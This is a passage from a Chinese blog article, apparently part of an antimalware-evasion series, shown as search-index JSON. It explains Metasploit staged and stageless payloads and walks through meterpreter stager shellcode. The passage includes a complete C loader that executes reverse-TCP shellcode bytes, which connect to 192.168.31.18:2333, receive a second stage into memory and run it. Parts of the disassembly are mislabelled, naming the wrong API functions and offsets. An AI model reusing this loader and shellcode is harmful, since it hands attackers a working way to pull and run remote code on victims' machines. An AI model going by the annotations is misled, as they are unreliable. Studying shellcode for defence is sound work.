<p>\u5982\u679c\u6728\u9a6c\u7a0b\u5e8f\u4e0e\u78c1\u76d8\u4e2d\u7684\u6587\u4ef6\u5173\u8054\u6211\u4eec\u9700\u8981\u4f9d\u6258\u6587\u4ef6\u8fd0\u884c\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a\u6709\u6587\u4ef6\uff08\u7a0b\u5e8f\u8fd0\u884c\u65f6\u6211\u4eec\u4f1a\u65e0\u6cd5\u5220\u9664\u6587\u4ef6\uff0c\u53ea\u6709\u5173\u95ed\u8fdb\u7a0b\u624d\u80fd\u5220\u9664\u6587\u4ef6\uff09</p> <p>\u5f53\u7136\u8fd9\u6bb5shellcode\u53ea\u6709\u5728data\u6bb5\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u88abCPU\u8bc6\u522b\u6210\u662f\u4ee3\u7801\uff0c\u624d\u6709\u673a\u4f1a\u8fd0\u884c</p> <p></p>"},{"location":"CTF/Antimalware_evasion/Article1/index.html#shellcodemsfcs","title":"shellcode\u5728msf\u548ccs\u4e2d\u626e\u6f14\u4e86\u4e00\u4e2a\u4ec0\u4e48\u6837\u7684\u89d2\u8272\uff1f","text":""},{"location":"CTF/Antimalware_evasion/Article1/index.html#stagedstageless","title":"staged\u548cstageless","text":"<p>shellcode--\u5c0f\u9a6c--\u53ea\u8d1f\u8d23\u8fde\u63a5</p> <p>meterprete--\u5927\u9a6c--\u771f\u6b63\u5305\u542b\u529f\u80fd\u6a21\u5757\uff0c\u5b9e\u73b0\u5404\u9879\u529f\u80fd</p> <p>\u5c0f\u9a6c\u7b2c\u4e00\u6b21\u628a\u5927\u9a6c\u62c9\u4e0a\u7684\u65f6\u5019\uff0c\u53ea\u52a0\u8f7d\u4e86Core Commands\u4e2d\u7684\u529f\u80fd</p> <p></p> <p>\u5b9e\u73b0\u5176\u4ed6\u529f\u80fd\u5c31\u9700\u8981meterpreter\u518d\u62c9\u5176\u4ed6\u6587\u4ef6,\u53cd\u5c04DLL\u6ce8\u5165</p> <p></p> <p>\u4e0a\u9762\u8fd9\u79cd\u9636\u6bb5\u5316\u7684\u8fc7\u7a0b\u6211\u4eec\u79f0\u4e4b\u4e3astaged</p> <p>\u5982\u679c\u6211\u4eec\u7684shellcode\u76f4\u63a5\u5c31\u662fmeterpreter,\u4e0d\u9700\u8981\u5c0f\u9a6c\u62c9\u5927\u9a6c</p> <p>\u90a3\u4e48\u5728\u5b9e\u9645\u4f7f\u7528\u4e2d\u5982\u4f55\u533a\u5206\u5927\u9a6c\u548c\u5c0f\u9a6c\uff1f</p> <p>\u6211\u4eec\u4ee5meterpreter\u4e2d\u7684windows\u76f8\u5173\u7684payload\u4e3e\u4f8b</p> <p></p> <p></p> <p>\u901a\u8fc7\u5bf9\u6bd4\u53ef\u4ee5\u53d1\u73b0\uff0c\u7b2c\u4e00\u5f20\u4e2d\u540d\u5b57\u548c\u7b2c\u4e8c\u5f20\u7684\u533a\u522b\u5728\u4e8e\u4e00\u4e2a\u662f'/'\u4e00\u4e2a\u662f'_'</p> <p>\u901a\u8fc7\u8fd9\u4e00\u533a\u522b\u6211\u4eec\u53ef\u4ee5\u533a\u5206shell_reverse_tcp\u548cshell/reverse_tcp\u5206\u522b\u662fstageless\u548cstaged\u7c7b\u578b</p> <p>\u5728Cobalt Strike\u4e2d\uff0c\u5982\u679c\u9009\u62e9\u751f\u6210\u7684\u662fpayload generator,\u90a3\u4e48\u9ed8\u8ba4\u662fstaged\u7684\uff0c\u5206\u9636\u6bb5</p> <p></p> <p>\u5982\u679c\u76f4\u63a5\u9009\u62e9\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6\uff0cwindows executable\u5982\u679c\u4e0d\u5e26s,\u5c31\u662f\u5206\u9636\u6bb5\u7684\uff0c\u5e26\u5c31\u662f\u4e0d\u5206\u9636\u6bb5\u7684</p> <p>\u518d\u804a\u804amsf\u4e2dpayload\u540d\u79f0\u7684\u5206\u7c7b</p> <p></p> <p>windows\u4ee3\u8868\u4f7f\u7528\u7684\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\uff0cx64\u4ee3\u8868\u7cfb\u7edf\u4f4d\u6570\uff0cvncinject\u4ee3\u8868\u76d1\u542c\u7aef\u8981\u505a\u7684\u5177\u4f53\u64cd\u4f5c\uff08\u62ff\u5230\u4f1a\u8bdd\u540e\u7684\u64cd\u4f5c\u5de5\u5177\uff09\uff0creverse\u4ee3\u8868\u53cd\u5411\u8fde\u63a5\uff0c\u5bf9\u65b9\u4e3b\u52a8\u6765\u8fde\u6211\u4eec\uff08bind\u4ee3\u8868\u6b63\u5411\uff0c\u6211\u4eec\u4e3b\u52a8\u53bb\u8fde\u5bf9\u65b9\uff0c\u4e0d\u5e38\u7528\uff09tcp\u4ee3\u8868\u4e86\u8fde\u63a5\u65b9\u5f0f\uff0c\u91c7\u7528\u7684\u4ec0\u4e48\u901a\u4fe1\u534f\u8bae\uff0crc4\u4ee3\u8868\u52a0\u5bc6\u65b9\u5f0f,\u5176\u4ed6\u5728rc4\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u901a\u5e38\u4ee3\u8868\u4e00\u4e9b\u52a0\u5bc6\u65b9\u6cd5\u6216\u8005\u5176\u4ed6\u7279\u6b8a\u624b\u6bb5</p>"},{"location":"CTF/Antimalware_evasion/Article1/index.html#shellcode_1","title":"shellcode\u5b9e\u73b0\u7684\u7ec6\u8282","text":"<pre><code>#include &lt;stdio.h&gt;\n#include&lt;windows.h&gt;\nunsigned char buf[] = \n\"\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x31\\xd2\\x89\\xe5\\x64\\x8b\\x52\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x31\\xff\\x0f\\xb7\\x4a\\x26\\x8b\\x72\\x28\"\n\"\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\x49\"\n\"\\x75\\xef\\x52\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x57\\x01\\xd0\\x8b\\x40\\x78\"\n\"\\x85\\xc0\\x74\\x4c\\x01\\xd0\\x50\\x8b\\x58\\x20\\x01\\xd3\\x8b\\x48\\x18\"\n\"\\x85\\xc9\\x74\\x3c\\x31\\xff\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xc0\\xc1\"\n\"\\xcf\\x0d\\xac\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\"\n\"\\x75\\xe0\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\"\n\"\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\"\n\"\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\"\n\"\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\"\n\"\\x07\\x89\\xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\"\n\"\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\xc0\\xa8\\x1f\\x12\\x68\\x02\"\n\"\\x00\\x09\\x1d\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\"\n\"\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\"\n\"\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\\x00\\x00\"\n\"\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\"\n\"\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\"\n\"\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\"\n\"\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x68\\x00\"\n\"\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x68\"\n\"\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x5e\\x5e\\xff\\x0c\\x24\\x0f\\x85\\x70\\xff\"\n\"\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\x01\\xc3\\x29\\xc6\\x75\\xc1\\xc3\\xbb\"\n\"\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5\";\nvoid main()\n{\n    ((void(*)(void)) &amp; buf)();\n}\n</code></pre> <ul> <li>\u5305\u542b\u5934\u6587\u4ef6\uff1a</li> </ul> <p><code>#include &lt;stdio.h&gt;</code>\uff1a\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\u5934\u6587\u4ef6\u3002 <code>#include &lt;windows.h&gt;</code>\uff1aWindows API \u5934\u6587\u4ef6\u3002</p> <ul> <li>\u5b9a\u4e49 Shellcode\uff1a</li> </ul> <p>unsigned char buf[] = {...};\uff1a\u5b9a\u4e49\u4e00\u4e2a\u5b57\u7b26\u6570\u7ec4 buf\uff0c\u5b58\u50a8\u4e00\u6bb5 Shellcode\uff08\u5341\u516d\u8fdb\u5236\u5b57\u8282\u7801\uff09\u3002</p> <ul> <li>\u6267\u884c Shellcode\uff1a</li> </ul> <p>void main() { ((void(*)(void)) &amp; buf)(); }\uff1a\u5c06 buf \u7684\u5730\u5740\u5f3a\u5236\u8f6c\u6362\u4e3a\u4e00\u4e2a\u51fd\u6570\u6307\u9488\uff0c\u5e76\u8c03\u7528\u5b83\u3002\u8fd9\u6bb5\u4ee3\u7801\u7684\u4f5c\u7528\u662f\u76f4\u63a5\u6267\u884c buf \u4e2d\u7684 Shellcode\u3002</p> <p>Shellcode \u5206\u6790\uff1a</p> <p>1.\u521d\u59cb\u8bbe\u7f6e\uff1a\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x31\\xd2\\x89\\xe5\\x64\\x8b\\x52\\x30</p> <p><code>\\xfc</code>\uff1a\u6e05\u9664\u65b9\u5411\u6807\u5fd7\u3002 <code>\\xe8\\x8f\\x00\\x00\\x00</code>\uff1a\u8c03\u7528\u4e0b\u4e00\u6761\u6307\u4ee4\uff0c\u83b7\u53d6\u5f53\u524d\u5730\u5740\u3002 <code>\\x60</code>\uff1a\u4fdd\u5b58\u6240\u6709\u901a\u7528\u5bc4\u5b58\u5668\u3002 <code>\\31\\xd2</code>\uff1a\u5c06 EDX \u5bc4\u5b58\u5668\u6e05\u96f6\u3002 <code>\\x89\\xe5</code>\uff1a\u5c06 ESP \u5bc4\u5b58\u5668\u7684\u503c\u590d\u5236\u5230 EBP\u3002 <code>\\x64\\x8b\\x52\\x30</code>\uff1a\u4ece FS \u6bb5\u5bc4\u5b58\u5668\u8bfb\u53d6 PEB \u7684\u5730\u5740\u3002</p> <p>2.PEB\u904d\u5386\uff1a</p> <p><code>\\x8b\\x52\\x0c</code>\uff1a\u83b7\u53d6 PEB \u7684 Ldr \u5730\u5740\u3002 <code>\\x8b\\x52\\x14</code>\uff1a\u83b7\u53d6 Ldr.InMemoryOrderModuleList \u94fe\u8868\u7684\u5730\u5740\u3002</p> <p>3.\u6a21\u5757\u904d\u5386\u548c\u5b57\u7b26\u4e32\u6bd4\u8f83\uff1a</p> <p><code>\\x31\\xff\\x0f\\xb7\\x4a\\x26</code>\uff1a\u904d\u5386\u6a21\u5757\u94fe\u8868\uff0c\u67e5\u627e\u7279\u5b9a\u6a21\u5757\uff08\u4f8b\u5982 kernel32.dll\uff09\u3002 <code>\\x8b\\x72\\x28</code>\uff1a\u83b7\u53d6\u6a21\u5757\u7684\u57fa\u5730\u5740\u3002</p> <p>4.\u5bfc\u51fa\u8868\u89e3\u6790\uff1a</p> <p><code>\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20</code>\uff1a\u89e3\u6790\u6a21\u5757\u7684\u5bfc\u51fa\u8868\uff0c\u67e5\u627e\u7279\u5b9a\u51fd\u6570\uff08\u5982 LoadLibraryA \u548c GetProcAddress\uff09\u3002 <code>\\xc1\\xcf\\x0d\\x01\\xc7\\x49\\x75\\xef</code>\uff1a\u7ee7\u7eed\u904d\u5386\u548c\u6bd4\u8f83\u5bfc\u51fa\u51fd\u6570\u540d\u79f0\u3002</p> <p>5.\u51fd\u6570\u8c03\u7528\uff1a</p> <p><code>\\x52\\x8b\\x52\\x10\\x8b\\x42\\x3c</code>\uff1a\u8c03\u7528\u7279\u5b9a\u7684 Windows API \u51fd\u6570\uff0c\u901a\u5e38\u7528\u4e8e\u52a0\u8f7d\u65b0\u7684\u5e93\u6216\u83b7\u53d6\u51fd\u6570\u5730\u5740\u3002 <code>\\x57\\x01\\xd0\\x8b\\x40\\x78</code>\uff1a\u51c6\u5907\u8c03\u7528 LoadLibraryA \u6216 GetProcAddress\u3002 6.\u7f51\u7edc\u64cd\u4f5c\uff1a</p> <p><code>\\x68\\xc0\\xa8\\x1f\\x12</code>\uff1a\u8bbe\u7f6e IP \u5730\u5740\uff08192.168.31.18\uff09\u3002 <code>\\x68\\x02\\x00\\x09\\x1d</code>\uff1a\u8bbe\u7f6e\u7aef\u53e3\uff082333\uff09\u3002 <code>\\xff\\xd5</code>\uff1a\u6267\u884c\u7f51\u7edc\u64cd\u4f5c\uff0c\u901a\u5e38\u662f\u521b\u5efa\u7f51\u7edc\u8fde\u63a5\u3002 7.\u6e05\u7406\u548c\u8fd4\u56de\uff1a</p> <p><code>\\x83\\xf8\\x00\\x7e\\x36</code>\uff1a\u68c0\u67e5\u64cd\u4f5c\u7ed3\u679c\u3002 <code>\\xc3</code>\uff1a\u51fd\u6570\u8fd4\u56de\u3002</p> <p>\u4ee5\u4e0b\u662f\u9010\u6761\u89e3\u6790\u540e\u7684\u6c47\u7f16\u8bed\u8a00\u4ee3\u7801\uff1a</p> <pre><code>; Shellcode start\nfc                      cld                         ; Clear direction flag\ne8 8f 00 00 00          call 0x94                   ; Call to next instruction\n60                      pusha                       ; Push all general-purpose registers onto stack\n31 d2                   xor edx, edx                ; Zero out EDX\n89 e5                   mov ebp, esp                ; Move ESP to EBP\n64 8b 52 30             mov edx, fs:[edx+0x30]      ; Move PEB to EDX\n8b 52 0c                mov edx, [edx+0xc]          ; Move PEB_LDR_DATA to EDX\n8b 52 14                mov edx, [edx+0x14]         ; Move InMemoryOrderModuleList to EDX\n31 ff                   xor edi, edi                ; Zero out EDI\n0f b7 4a 26             movzx ecx, word [edx+0x26]  ; Move export table number of functions to ECX\n8b 72 28                mov esi, [edx+0x28]         ; Move module base address to ESI\n31 c0                   xor eax, eax                ; Zero out EAX\nac                      lodsb                       ; Load byte at DS:(E)SI into AL\n3c 61                   cmp al, 0x61                ; Compare AL with 0x61\n7c 02                   jl 0x36                     ; Jump if less\n2c 20                   sub al, 0x20                ; Subtract 0x20 from AL\nc1 cf 0d                ror edi, 0xd                ; Rotate right EDI by 13 bits\n01 c7                   add edi, eax                ; Add EAX to EDI\n49                      dec ecx                     ; Decrement ECX\n75 ef                   jnz 0x21                    ; Jump if not zero\n52                      push edx                    ; Push EDX\n8b 52 10                mov edx, [edx+0x10]         ; Move module base address to EDX\n8b 42 3c                mov eax, [edx+0x3c]         ; Move PE header to EAX\n57                      push edi                    ; Push EDI\n01 d0                   add eax, edx                ; Add EDX to EAX\n8b 40 78                mov eax, [eax+0x78]         ; Move export directory to EAX\n85 c0                   test eax, eax               ; Test EAX\n74 4c                   je 0x94                     ; Jump if zero\n01 d0                   add eax, edx                ; Add EDX to EAX\n50                      push eax                    ; Push EAX\n8b 58 20                mov ebx, [eax+0x20]         ; Move names to EBX\n01 d3                   add ebx, edx                ; Add EDX to EBX\n8b 48 18                mov ecx, [eax+0x18]         ; Move number of names to ECX\n85 c9                   test ecx, ecx               ; Test ECX\n74 3c                   je 0x96                     ; Jump if zero\n31 ff                   xor edi, edi                ; Zero out EDI\n49                      dec ecx                     ; Decrement ECX\n8b 34 8b                mov esi, [ebx+ecx*4]        ; Move name pointer to ESI\n01 d6                   add esi, edx                ; Add EDX to ESI\n31 c0                   xor eax, eax                ; Zero out EAX\nc1 cf 0d                ror edi, 0xd                ; Rotate right EDI by 13 bits\nac                      lodsb                       ; Load byte at DS:(E)SI into AL\n01 c7                   add edi, eax                ; Add EAX to EDI\n38 e0                   cmp al, ah                  ; Compare AL with AH\n75 f4                   jnz 0x60                    ; Jump if not zero\n03 7d f8                add edi, [ebp-0x8]          ; Add [EBP-8] to EDI\n3b 7d 24                cmp edi, [ebp+0x24]         ; Compare EDI with [EBP+24]\n75 e0                   jnz 0x44                    ; Jump if not zero\n58                      pop eax                     ; Pop EAX\n8b 58 24                mov ebx, [eax+0x24]         ; Move function pointer to EBX\n01 d3                   add ebx, edx                ; Add EDX to EBX\n66 8b 0c 4b             mov cx, [ebx+ecx*2]         ; Move ordinal to CX\n8b 58 1c                mov ebx, [eax+0x1c]         ; Move address table to EBX\n01 d3                   add ebx, edx                ; Add EDX to EBX\n8b 04 8b                mov eax, [ebx+ecx*4]        ; Move function address to EAX\n01 d0                   add eax, edx                ; Add EDX to EAX\n89 44 24 24             mov [esp+0x24], eax         ; Move EAX to [ESP+24]\n5b                      pop ebx                     ; Pop EBX\n5b                      pop ebx                     ; Pop EBX\n61                      popa                        ; Pop all general-purpose registers from stack\n59                      pop ecx                     ; Pop ECX\n5a                      pop edx                     ; Pop EDX\n51                      push ecx                    ; Push ECX\nff e0                   jmp eax                     ; Jump to EAX\n58                      pop eax                     ; Pop EAX\n5f                      pop edi                     ; Pop EDI\n5a                      pop edx                     ; Pop EDX\n8b 12                   mov edx, [edx]              ; Move value at EDX to EDX\ne9 80 ff ff ff          jmp 0x85                    ; Jump to 0x85\n\n; LoadLibrary and GetProcAddress for user32.dll\n5d                      pop ebp                     ; Pop EBP\n68 33 32 00 00          push 0x3233                 ; Push 0x3233 ('23')\n68 77 73 32 5f          push 0x5f327377             ; Push 'ws2_32'\n54                      push esp                    ; Push ESP\n68 4c 77 26 07          push 0x72674c               ; Push 'KERNEL32.DLL'\n89 e8                   mov eax, esp                ; Move ESP to EAX\nff d0                   call eax                    ; Call EAX\nb8 90 01 00 00          mov eax, 0x190              ; Move 0x190 to EAX\n29 c4                   sub esp, eax                ; Subtract EAX from ESP\n54                      push esp                    ; Push ESP\n50                      push eax                    ; Push EAX\n68 29 80 6b 00          push 0x6b8029               ; Push 'GetModuleHandleA'\nff d5                   call ebp                    ; Call EBP\n6a 0a                   push 0xa                    ; Push 0xA\n68 c0 a8 1f 12          push 0x121fa8c0             ; Push 192.168.31.18\n68 02 00 09 1d          push 0x1d090002             ; Push 2333\n89 e6                   mov esi, esp                ; Move ESP to ESI\n50                      push eax                    ; Push EAX\n50                      push eax                    ; Push EAX\n50                      push eax                    ; Push EAX\n50                      push eax                    ; Push EAX\n40                      inc eax                     ; Increment EAX\n50                      push eax                    ; Push EAX\n40                      inc eax                     ; Increment EAX\n50                      push eax                    ; Push EAX\n68 ea 0f df e0          push 0xe0df0fea             ; Push 'InternetConnectA'\nff d5                   call ebp                    ; Call EBP\n97                      xchg eax, edi               ; Exchange EAX and EDI\n6a 10                   push 0x10                   ; Push 0x10\n56                      push esi                    ; Push ESI\n57                      push edi                    ; Push EDI\n68 99 a5 74 61          push 0x6174a599             ; Push 'bind'\nff d5                   call ebp                    ; Call EBP\n85 c0                   test eax, eax               ; Test EAX\n74 0a                   je 0x3a                     ; Jump if zero\nff 4e 08                dec dword [esi+0x8]         ; Decrement dword at [ESI+8]\n75 ec                   jnz 0x2f                    ; Jump if not zero\ne8 67 00 00 00          call 0x6c                   ; Call 0x6c\n6a 00                   push 0x0                    ; Push 0\n</code></pre> <p></p> <p>msf\u6e90\u7801\uff1a</p> <p>https://github.com/rapid7/metasploit-framework/tree/master/external/source/shellcode/windows/x86/src/block</p>"},{"location":"CTF/Antimalware_evasion/Article1/index.html#1hashapi","title":"1.hash\u5bfb\u627eapi\u51fd\u6570","text":"<p>windows api\u51fd\u6570\u90fd\u4f1a\u5199\u5728dll\u6587\u4ef6\u4e2d</p>"},{"location":"CTF/Antimalware_evasion/Article1/index.html#hashapi","title":"\u4e3a\u4ec0\u4e48\u8981hash\u5bfb\u627eapi\u51fd\u6570\uff1f","text":"<p>\u4e0a\u9762\u7684\u4ee3\u7801\u505a\u4e86\u4ec0\u4e48\uff1f\u8fd9\u91cc\u5c31\u548c\u524d\u9762\u8c08\u5230\u65e0\u6587\u4ef6\u548c\u6709\u6587\u4ef6\u6709\u5173\u4e86\uff0cWindows\u5e73\u53f0\u4e0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u683c\u5f0f\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3aPE\uff08Portable Executable\uff09\u6587\u4ef6\u7ed3\u6784\u3002PE\u57fa\u7840</p> <p>PE\u8868\u4e2d\u6709\u4e00\u4e2a\u5bfc\u5165\u8868\uff0c\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u77e5\u9053\u7528\u6587\u4ef6\u8c03\u7528\u4e86\u54ea\u4e9bwindows api\u51fd\u6570\uff0c\u51fd\u6570\u5730\u5740\u5c31\u5728\u5176\u4e2d</p> <p>\u800c\u65e0\u6587\u4ef6shellcode\u662f\u6ca1\u6709PE\u7ed3\u6784\u7684\uff0c\u4e5f\u5c31\u65e0\u6cd5\u53bb\u8c03\u7528\u5404\u79cdapi,\u6240\u4ee5\u6c47\u7f16\u4ee3\u7801\u4e2d\u5982\u679c\u4e3a\u4e86\u5b9e\u73b0\u4e00\u4e9b\u529f\u80fd\u9700\u8981\u8c03\u7528windows api\uff0c\u90a3\u4e48\u53ea\u80fd\u81ea\u884c\u53bb\u5bfb\u627e\uff0c\u8fd9\u4e5f\u662f\u7b2c\u4e00\u6bb5shellcode\u5b9e\u73b0\u7684\u65b9\u6cd5.</p> <p>\u4efb\u4f55\u4e00\u4e2aexe\u6587\u4ef6\u90fd\u4f1a\u8c03\u7528kernal32.dll,\u5982\u679c\u6211\u4eec\u8981\u8c03\u7528\u7684\u51fd\u6570\u4e0d\u5728\u8fd9\u4e2adll\u4e2d\uff0c\u5c31\u9700\u8981\u5229\u7528kernal32.dll\u4e2d\u7684LoadLibrary\u51fd\u6570\u53bb\u52a0\u8f7d\u5176\u4ed6DLL\u6587\u4ef6.</p> <p>\u4f8b\u5982LoadLibrary(user32.dll)</p> <p>\u8fd9\u91cc\u9996\u5148\u628a\u9700\u8981\u7684\u51fd\u6570\u540d\u5b57\u8f6c\u6362\u6210\u4e00\u4e2ahash\u503c,</p> <p></p> <p>\u7136\u540e\u901a\u8fc7\u4e00\u79cd\u65b9\u5f0f\u53bb\u627e\u51fd\u6570\uff0c\u63a5\u4e0b\u6765\u662f\u4e00\u4e2a\u590d\u6742\u7684\u8fc7\u7a0b</p> <p>\u9700\u8981\u901a\u8fc7\u904d\u5386\u8fdb\u7a0b\u6a21\u5757\u7684\u65b9\u5f0f\u53bb\u67e5\u627euser32.dll\u7684\u5730\u5740</p> <p>\u5177\u4f53\u5c31\u662f\u505a\u4e86\u4e0b\u56fe\u6240\u793a\u7684\u8fc7\u7a0b,teb\u548cpeb\u662f\u4e24\u4e2a\u7ed3\u6784\u4f53\uff0cteb\u4e2d\u5305\u542b\u8fdb\u7a0b\u4e2d\u8fd0\u884c\u7ebf\u7a0b\u7684\u5404\u79cd\u4fe1\u606f\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u5bf9\u5e94\u4e00\u4e2aTEB\u7ed3\u6784\u4f53\u3002</p> <p></p> <p>\u5728\u627e\u5230dll\u6587\u4ef6\u4e4b\u540e\uff0c\u5c31\u8981\u8bfbdll\u6587\u4ef6\u7684PE\u7ed3\u6784\uff08EXE\u6587\u4ef6\u4e0eDLL\u6587\u4ef6\u7684\u533a\u522b\u5b8c\u5168\u662f\u8bed\u4e49\u4e0a\u7684\u3002\u5b83\u4eec\u4f7f\u7528\u7684\u662f\u76f8\u540c\u7684PE\u683c\u5f0f\u3002\u60df\u4e00\u7684\u4e0d\u540c\u5728\u4e8e\u4e00\u4e2a\u4f4d\uff0c\u8fd9\u4e2a\u4f4d\u7528\u6765\u6307\u793a\u6587\u4ef6\u5e94\u8be5\u4f5c\u4e3aEXE\u8fd8\u662fDLL\u3002\uff09</p> <p>\u524d\u9762\u627e\u5bfc\u5165\u51fd\u6570\uff0c\u8fd9\u91cc\u901a\u8fc7dll\u7684\u5bfc\u51fa\u8868\u627e\u9700\u8981\u5bfc\u51fa\u7684\u51fd\u6570</p> <p>\u8fd9\u91cc\u548c\u524d\u9762\u4e00\u6837\u91c7\u7528hash\u7684\u65b9\u6cd5\u5c06\u51fd\u6570\u540d\u5b57\u53d8\u6570\u5b57\uff0c\u7136\u540e\u904d\u5386\uff0c\u5339\u914d\u76f8\u540c\u6570\u5b57\u5c31\u80fd\u627e\u5230\u9700\u8981\u7684\u51fd\u6570</p> <p></p> <p>\u4e0a\u9762\u6574\u4e32\u4ee3\u7801\u76f8\u5f53\u4e8e\u5b9a\u4e49\u4e86\u4e00\u4e2a\u51fd\u6570</p> <p>def hanshu\uff08api\u51fd\u6570\u540d\u5b57\uff09</p>"},{"location":"CTF/Antimalware_evasion/Article1/index.html#2tcp","title":"2.\u5efa\u7acb\u4e00\u4e2atcp\u8fde\u63a5","text":"<p>\u6c47\u7f16\u4ee3\u7801\uff1a</p> <p></p> <p></p> <p>\u8fd9\u91cc\u6c47\u7f16\u4e0a\u6765\u505a\u4e86\u4e00\u4e2acall ebp</p> <p></p> <p>\u5176\u5b9e\u5c31\u662f\u5c06\u524d\u9762\u7b2c\u4e00\u90e8\u5206\u7684\u6240\u505a\u7684\u4e8b\u8c03\u7528\u8fc7\u6765,\u6240\u4ee5\u4e0a\u9762\u7684\u5185\u5bb9\u53ef\u4ee5\u8fd9\u4e48\u7406\u89e3:def hanshu\uff08api\u51fd\u6570\u540d\u5b57\uff09----&gt;def ebp(0x0726774c),\u6700\u540e\u52a0\u8f7d\u4e86\u4e00\u4e2aws2_32.dll\u6587\u4ef6.</p> <p></p> <p>\u63a5\u4e0b\u6765\u662f\u5dee\u4e0d\u591a\u7684\u64cd\u4f5c</p> <p>\u627e\u5230ws2_32.dll\u4e2d\u7684WSAStartup\u51fd\u6570\uff0c\u7136\u540e\u8c03\u7528\u4e86\u8fd9\u4e2a\u51fd\u6570WSAStartup()</p> <p></p> <p>\u8fd9\u4e2a\u51fd\u6570\u4f1a\u76f4\u63a5\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u7684\u9a71\u52a8\u544a\u8bc9\u7f51\u5361\u51c6\u5907\u7f51\u7edc\u8fde\u63a5</p> <p>\u63a5\u4e0b\u6765\u662f\u8bbe\u7f6e\u57fa\u672c\u53c2\u6570\u5f00\u59cb\u8fde\u63a5</p> <p></p> <p>\u8fd9\u91ccWSASocketA\u4e2dAF_INET\u4ee3\u8868IPV4\uff0cpush\u8fdb\u53bb\u7684eax\u503c\u662f2\uff08\u5982\u679ceax\u662f23\u90a3\u5c31\u662fIPV6\uff09</p> <p></p> <p>SOCKET_STREAM\u4ee3\u8868TCP\u8fde\u63a5</p> <p></p> <p>IP\u5730\u5740\u548c\u7aef\u53e3\u53f7</p> <p></p> <p>\u5176\u4e2dIP\u5730\u5740\u8f6c16\u8fdb\u5236\u662f\u5c0f\u7aef\u5e8f\u8bfb\u53d6</p> <p></p> <p>\u8fd9\u91cc\u53ef\u4ee5ollydbg\u8c03\u8bd5\u4e00\u4e0b\u770b\u770b\u8fd4\u56de\u7684IP\u5730\u5740\uff0c\u5206\u6790\u4e00\u4e0b</p> <p>\u7136\u540e\u5c31\u662f\u8fde\u63a5</p> <p></p> <p>connect()\u4e2ds\u5c31\u662f\u524d\u9762WSASocketA()\uff0c&amp;sockaddr\u662f\u524d\u9762set_address\u4e00\u6bb5\u4e2d\u7684\u53c2\u6570\uff0c\u5305\u62ecip\u5730\u5740\u548c\u7aef\u53e3\u53f7\u4fe1\u606f\u7684\u6574\u4e2a\u7ed3\u6784\u4f53\u7684\u6307\u9488\uff0c16\u662fsockaddr\u8fd9\u4e2a\u7ed3\u6784\u4f53\u7684\u957f\u5ea6</p>"},{"location":"CTF/Antimalware_evasion/Article1/index.html#3","title":"3.\u5c06\u8fde\u63a5\u63a5\u6536\u5230\u7684\u4e1c\u897f\u653e\u5728\u5185\u5b58\u4e2d","text":"<p>\u524d\u9762\u7684\u770b\u5b8c\u5230\u8fd9\u91cc\u4e5f\u4e0d\u662f\u5f88\u96be\u7406\u89e3\u4e86</p> <p>\u5728\u8fde\u63a5\u4e0a\u540e\uff0c\u5c31\u9700\u8981\u8c03\u7528meterpreter\u7684\u529f\u80fd\uff0c\u6240\u4ee5\u9700\u8981\u63a5\u6536</p> <p></p> <p>\u56e0\u4e3ameterpreter\u7684\u6570\u636e\u4e0d\u662f\u4e00\u4e2a\u6587\u4ef6\uff0c\u800c\u662f\u4e00\u4e32\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6240\u4ee5\u9700\u8981\u7533\u8bf7\u4e00\u5757\u7a7a\u95f4\u5730\u5740\u5b58\u653e\u6570\u636e\u7136\u540e\u8fd0\u884c</p> <p></p> 